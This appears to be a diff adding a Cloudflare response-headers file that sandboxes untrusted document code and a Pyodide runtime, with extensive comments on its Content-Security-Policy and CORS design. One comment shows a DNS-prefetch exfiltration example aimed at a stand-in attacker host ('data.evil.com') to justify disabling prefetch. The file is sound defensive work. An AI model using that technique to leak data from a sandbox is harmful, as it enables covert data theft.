@@ -1,0 +1,88 @@
+# Response headers for the sandbox origin, served by the Cloudflare assets
+# runtime in production (copied into ./dist by the build). Three concerns live
+# here:
+#
+#   1. CORS + resource policy — the opaque `allow-scripts` iframe fetches the
+#      Pyodide wasm/wheels cross-origin, so they must be CORS-readable. `.wasm`
+#      is served as `application/wasm` by the assets runtime natively. This
+#      origin serves no credentials and reads no cookies, so `*` is safe.
+#
+#   2. Content-Security-Policy — the network posture below IS the containment
+#      model for untrusted document code:
+#        - default-src 'none' is the floor: anything not explicitly enumerated
+#          below is denied, so a fetch directive left unset blocks rather than
+#          inheriting a permissive fallback.
+#        - connect-src is the one directive that differs per entry point. Only
+#          the Python runtime installs wheels, so only /python.html may reach the
+#          two PyPI hosts micropip needs (pypi.org for the JSON index,
+#          files.pythonhosted.org for the wheels); every other path — the
+#          document renderer included — reaches nothing but this origin itself,
+#          which is where the Python runtime's interpreter, lock file and stdlib
+#          are self-hosted. No other fetch/XHR/WebSocket destination is reachable
+#          from either, so document code cannot exfiltrate or call out to
+#          arbitrary hosts. The module CDN
+#          (esm.sh) is deliberately NOT here — it is a script-src source, not a
+#          fetch target, so imports work but fetch() to it does not.
+#        - frame-src/child-src/worker-src/object-src 'none': untrusted code
+#          cannot spawn a child frame, worker, or object. Beyond blocking those
+#          as egress/compute, this denies a fresh realm — the only way to recover
+#          the WebRTC constructors the bootstrap deletes from this frame.
+#        - webrtc 'block': connect-src does NOT govern WebRTC. This directive is a
+#          draft Chromium does not enforce, so the real block is the bootstrap
+#          deleting the RTCPeerConnection constructors before document code runs;
+#          the directive is kept for engines that may honor it later.
+#        - script-src allows this origin named in full, the module CDN
+#          for ES-module imports, `blob:` for the in-browser-transpiled module
+#          the renderer imports, 'wasm-unsafe-eval' for the Pyodide WebAssembly
+#          runtime, and 'unsafe-inline' because the sandbox exists to run the
+#          document's OWN scripts — an html document IS inline <script>, classic
+#          or module, and a static file cannot nonce arbitrary user code.
+#          Inline execution grants no new capability: containment is the opaque
+#          origin plus the network lockdown above, not script-src. Built-in
+#          Pyodide packages are self-hosted on this origin; nothing loads from a
+#          third-party package CDN.
+#          The origin is spelled out — here and in every other fetch directive.
+#          ../src/csp.ts derives this policy from the origin it is served under
+#          and records the measurements behind spelling it out; this file is
+#          pinned to that derivation for the production origin, so the host
+#          below is not a value to edit by hand.
+#        - base-uri 'none' and form-action 'none' deny a base URL and a form
+#          submission target outright. No page this origin serves sets a <base>
+#          or carries a form, and the document iframe's sandbox attribute
+#          (DOCUMENT_IFRAME_SANDBOX_ATTR in
+#          packages/shared/src/documents/containment.ts) omits allow-forms, so
+#          the outright denies cost these pages nothing.
+#        - frame-ancestors limits embedders to the web app origin plus the
+#          production mobile app-shell origins: capacitor://native.hushbox.ai
+#          is the iOS WebView shell, https://native.hushbox.ai the Android one.
+#          No localhost embedder and no wildcard — arbitrary sites cannot frame
+#          this origin. A local stack's dev server serves the non-production
+#          derivation, which admits that stack's localhost embedders instead.
+#
+#   3. X-DNS-Prefetch-Control: off — CSP cannot cover DNS prefetch, so without
+#      this a document could leak data by encoding it into a hostname and
+#      triggering a lookup via `<link rel="dns-prefetch" href="//data.evil.com">`.
+#
+# The assets runtime applies the headers of EVERY block whose pattern matches,
+# and joins two same-named headers with a comma — which the CSP parser reads as
+# two policies enforced together, allowing only what both allow. So the
+# /python.html block below detaches the inherited policy with `!` before setting
+# its own; without that line its wheel hosts would be intersected away by the
+# /* policy and micropip would be refused in production.
+#
+# The split below is keyed by path, which couples it to `[assets] html_handling`
+# in ../wrangler.toml: that setting decides whether a request for /python.html is
+# answered at /python.html or redirected to some other path, and a redirected
+# response falls under whichever block matches where it landed, not this one. It
+# is pinned to `none` there for exactly this reason, and ../src/assets-runtime.test.ts
+# runs Cloudflare's assets runtime over both files together and fails if the two
+# ever disagree.
+/*
+  Access-Control-Allow-Origin: *
+  Cross-Origin-Resource-Policy: cross-origin
+  X-DNS-Prefetch-Control: off
+  Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline' 'wasm-unsafe-eval' blob: https://esm.sh https://sandbox.hushbox.ai; worker-src 'none'; connect-src https://sandbox.hushbox.ai; frame-src 'none'; child-src 'none'; object-src 'none'; webrtc 'block'; img-src blob: data: https://sandbox.hushbox.ai; style-src 'unsafe-inline' https://sandbox.hushbox.ai; font-src data: https://sandbox.hushbox.ai; frame-ancestors https://hushbox.ai capacitor://native.hushbox.ai https://native.hushbox.ai; base-uri 'none'; form-action 'none'
+
+/python.html
+  ! Content-Security-Policy
+  Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline' 'wasm-unsafe-eval' blob: https://esm.sh https://sandbox.hushbox.ai; worker-src 'none'; connect-src https://pypi.org https://files.pythonhosted.org https://sandbox.hushbox.ai; frame-src 'none'; child-src 'none'; object-src 'none'; webrtc 'block'; img-src blob: data: https://sandbox.hushbox.ai; style-src 'unsafe-inline' https://sandbox.hushbox.ai; font-src data: https://sandbox.hushbox.ai; frame-ancestors https://hushbox.ai capacitor://native.hushbox.ai https://native.hushbox.ai; base-uri 'none'; form-action 'none'
